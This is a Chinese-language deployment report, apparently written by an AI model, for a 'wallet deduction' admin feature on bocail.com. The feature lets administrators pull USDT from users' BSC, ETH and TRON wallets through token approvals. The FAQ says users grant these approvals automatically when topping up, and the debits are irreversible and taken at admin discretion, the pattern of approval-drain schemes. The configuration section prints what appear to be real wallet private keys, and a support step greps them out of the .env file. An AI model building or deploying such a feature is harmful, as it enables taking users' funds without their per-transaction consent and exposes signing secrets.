# 钱包扣费功能 - 部署完成报告

## 部署时间
2026-02-28 22:19

## 部署状态
✅ 全部完成并已上线

---

## 功能概述

管理后台新增"钱包扣费"功能，允许管理员直接从用户授权的钱包中扣除 USDT。

### 支持的区块链

| 链 | 状态 | 平台地址 | USDT 合约 |
|----|------|---------|----------|
| BSC | ✅ 已部署 | 0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4 | 0x55d398326f99059fF775485246999027B3197955 |
| ETH | ✅ 已部署 | 0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d | 0xdAC17F958D2ee523a2206206994597C13D831ec7 |
| TRON | ✅ 已部署 | TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi | TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t |

---

## 已完成的工作

### 1. 后端开发 ✅

**文件**: `backend/src/routes/walletDeductRoutes.js`

- ✅ 实现扣费 API (`POST /api/admin/users/deduct-from-wallet`)
- ✅ 实现授权查询 API (`GET /api/admin/users/check-allowance`)
- ✅ 支持 BSC、ETH、TRON 三条链
- ✅ 使用 `transferFrom` 方法从用户钱包扣费
- ✅ 检查用户授权额度和余额
- ✅ 检查平台钱包 Gas 费
- ✅ 记录扣费日志到数据库
- ✅ 路由已注册到 `server.js`

**技术栈**:
- EVM 链 (BSC/ETH): ethers.js v6
- TRON 链: TronWeb
- 数据库: MySQL

### 2. 数据库 ✅

**表**: `wallet_deduction_logs`

```sql
CREATE TABLE `wallet_deduction_logs` (
  `id` INT AUTO_INCREMENT PRIMARY KEY,
  `wallet_address` VARCHAR(255) NOT NULL,
  `amount` DECIMAL(20, 4) NOT NULL,
  `chain` VARCHAR(20) NOT NULL,
  `tx_hash` VARCHAR(255) NOT NULL,
  `reason` TEXT NOT NULL,
  `admin_remark` TEXT,
  `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_wallet_address` (`wallet_address`),
  INDEX `idx_chain` (`chain`),
  INDEX `idx_created_at` (`created_at`)
);
```

### 3. 前端开发 ✅

**文件**: `admin/src/views/Users.vue`

- ✅ 添加"扣费"按钮
- ✅ 扣费弹窗界面
- ✅ 支持选择链（BSC/ETH/TRON）
- ✅ 输入扣费金额和原因
- ✅ 二次确认机制
- ✅ 显示交易哈希和区块链浏览器链接
- ✅ 错误处理和提示

### 4. 配置 ✅

**环境变量** (`.env`):

```env
# BSC/ETH 转账私钥
TRANSFER_PRIVATE_KEY=0x3a81af486d4f6098b20cd9d3f365f7a5955c6af3da01213a622c29a99ecc6495

# TRON 转账私钥
TRON_PRIVATE_KEY=b8b204998410bafb47c0975a15be01423ce339ab5561bae0b662a532d0746ad4

# RPC URLs
BSC_RPC_URL=https://bsc-dataseed.binance.org
ETH_RPC_URL=https://eth.llamarpc.com
TRON_RPC_URL=https://api.trongrid.io
```

### 5. 部署 ✅

- ✅ 前端构建完成
- ✅ 管理后台构建完成
- ✅ Nginx 配置更新
- ✅ 后端服务重启 (PM2)
- ✅ 服务运行正常

**部署脚本**: `DEPLOY_BOCAIL.sh`

**访问地址**:
- 前端: https://bocail.com
- 管理后台: https://bocail.com/admin

---

## 使用说明

### 前提条件

1. **用户必须已授权**
   - 用户需要在钱包中授权平台地址可以使用其 USDT
   - 可以通过 API 查询授权状态：
     ```
     GET /api/admin/users/check-allowance?wallet_address=0x...&chain=BSC
     ```

2. **用户钱包有足够余额**
   - 用户钱包中必须有足够的 USDT 余额

3. **平台钱包有足够 Gas 费**
   - BSC: 需要 BNB（建议至少 0.1 BNB）
   - ETH: 需要 ETH（建议至少 0.01 ETH）
   - TRON: 需要 TRX（建议至少 30 TRX）

### 操作步骤

1. 登录管理后台: https://bocail.com/admin
2. 进入"用户管理"页面
3. 找到目标用户，点击"扣费"按钮
4. 填写扣费信息：
   - 扣费金额：输入 USDT 数量（0.01-10000）
   - 扣费链：选择 BSC、ETH 或 TRON
   - 扣费原因：必填（如：订阅费用、服务费等）
   - 操作员备注：可选
5. 点击"确认扣费"
6. 二次确认
7. 等待交易完成
8. 查看交易哈希

### API 接口

#### 扣费接口

```
POST /api/admin/users/deduct-from-wallet
```

**请求参数**:
```json
{
  "wallet_address": "0x...",
  "amount": 100,
  "chain": "BSC",
  "reason": "订阅费用",
  "admin_remark": "2024年1月订阅"
}
```

**返回示例**:
```json
{
  "success": true,
  "message": "扣费成功",
  "data": {
    "txHash": "0x...",
    "blockNumber": 12345678,
    "amount": 100,
    "chain": "BSC",
    "from": "0x...",
    "to": "0x..."
  }
}
```

#### 查询授权接口

```
GET /api/admin/users/check-allowance?wallet_address=0x...&chain=BSC
```

**返回示例**:
```json
{
  "success": true,
  "data": {
    "allowance": "1000.0000",
    "balance": "500.0000",
    "platform_address": "0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4",
    "chain": "BSC"
  }
}
```

---

## 测试建议

### 1. 准备测试环境

- 准备测试用户钱包（需要有 USDT 余额）
- 让测试用户授权平台地址
- 确保平台钱包有足够的 Gas 费

### 2. 测试步骤

1. **查询授权状态**
   ```bash
   curl "https://bocail.com/api/admin/users/check-allowance?wallet_address=0x...&chain=BSC"
   ```

2. **执行扣费**
   - 在管理后台执行扣费操作
   - 输入小额测试（如 1 USDT）

3. **验证结果**
   - 检查交易是否成功
   - 在区块链浏览器查看交易
   - 检查数据库日志记录

### 3. 区块链浏览器

- BSC: https://bscscan.com
- ETH: https://etherscan.io
- TRON: https://tronscan.org

---

## 安全注意事项

1. ✅ 谨慎保管私钥（已配置在 `.env` 文件中）
2. ✅ 定期检查平台钱包余额
3. ✅ 记录所有扣费操作（已实现日志记录）
4. ✅ 二次确认机制（已实现）
5. ✅ 限制扣费金额范围（0.01-10000 USDT）
6. ⚠️ 建议监控异常交易

---

## 常见问题

### Q1: 用户如何授权？

A: 用户可以通过以下方式授权：
1. 在 DApp 中进行充值操作时自动授权
2. 在区块链浏览器上手动授权
3. 在钱包（imToken/MetaMask）的授权管理中添加

详细教程请参考：`imToken使用教程.md`

### Q2: 扣费失败怎么办？

A: 检查以下几点：
1. 用户是否已授权（使用 check-allowance API）
2. 用户钱包余额是否足够
3. 平台钱包 Gas 费是否足够
4. 网络是否正常
5. 查看后端日志：`pm2 logs vitu-backend`

### Q3: 如何查看扣费记录？

A: 扣费记录保存在数据库 `wallet_deduction_logs` 表中，包含：
- 用户钱包地址
- 扣费金额
- 扣费链
- 交易哈希
- 扣费原因
- 管理员备注
- 创建时间

### Q4: 可以撤销扣费吗？

A: 不可以。扣费是链上交易，一旦确认就无法撤销。如需退款，需要另外转账给用户。

---

## 监控和维护

### 1. 检查服务状态

```bash
# 检查 PM2 状态
pm2 status

# 查看后端日志
pm2 logs vitu-backend

# 查看 Nginx 日志
tail -f /www/wwwlogs/bocail.com.access.log
tail -f /www/wwwlogs/bocail.com.error.log
```

### 2. 检查平台钱包余额

定期检查平台钱包的 Gas 费余额：

- **BSC**: 0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4
  - 需要 BNB（建议至少 0.1 BNB）
  - 查看: https://bscscan.com/address/0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4

- **ETH**: 0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d
  - 需要 ETH（建议至少 0.01 ETH）
  - 查看: https://etherscan.io/address/0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d

- **TRON**: TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi
  - 需要 TRX（建议至少 30 TRX）
  - 查看: https://tronscan.org/#/address/TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi

### 3. 数据库查询

```sql
-- 查看最近的扣费记录
SELECT * FROM wallet_deduction_logs 
ORDER BY created_at DESC 
LIMIT 10;

-- 统计扣费总额（按链）
SELECT chain, COUNT(*) as count, SUM(amount) as total
FROM wallet_deduction_logs
GROUP BY chain;

-- 查看某个用户的扣费记录
SELECT * FROM wallet_deduction_logs
WHERE wallet_address = '0x...'
ORDER BY created_at DESC;
```

---

## 相关文档

- `钱包扣费功能说明.md` - 完整使用说明
- `TRON扣费功能完成.md` - TRON 链开发总结
- `imToken使用教程.md` - 用户授权教程
- `backend/scripts/test_tron_deduction.js` - TRON 测试脚本

---

## 技术支持

如有问题，请检查：

1. **后端日志**
   ```bash
   pm2 logs vitu-backend --lines 100
   ```

2. **Nginx 日志**
   ```bash
   tail -f /www/wwwlogs/bocail.com.error.log
   ```

3. **数据库连接**
   ```bash
   mysql -u bocail -p bocail
   ```

4. **环境变量**
   ```bash
   cat backend/.env | grep PRIVATE_KEY
   ```

---

## 部署信息

- **部署时间**: 2026-02-28 22:19
- **部署方式**: 自动化脚本 (`DEPLOY_BOCAIL.sh`)
- **备份位置**: `/tmp/vitu-deploy-backup-20260228_221837`
- **服务状态**: ✅ 运行正常
- **访问地址**: https://bocail.com/admin

---

## 下一步建议

1. ⚠️ **给平台钱包充值 Gas 费**
   - BSC: 充值 0.1-0.5 BNB
   - ETH: 充值 0.01-0.05 ETH
   - TRON: 充值 50-100 TRX

2. ✅ **测试扣费功能**
   - 准备测试用户
   - 让用户授权平台地址
   - 执行小额扣费测试
   - 验证交易成功

3. ✅ **监控和维护**
   - 定期检查平台钱包余额
   - 查看扣费日志
   - 处理异常情况

4. ✅ **用户培训**
   - 告知用户如何授权
   - 提供授权教程
   - 解答用户疑问

---

**状态**: ✅ 已完成并上线  
**负责人**: AI Assistant  
**完成时间**: 2026-02-28 22:19
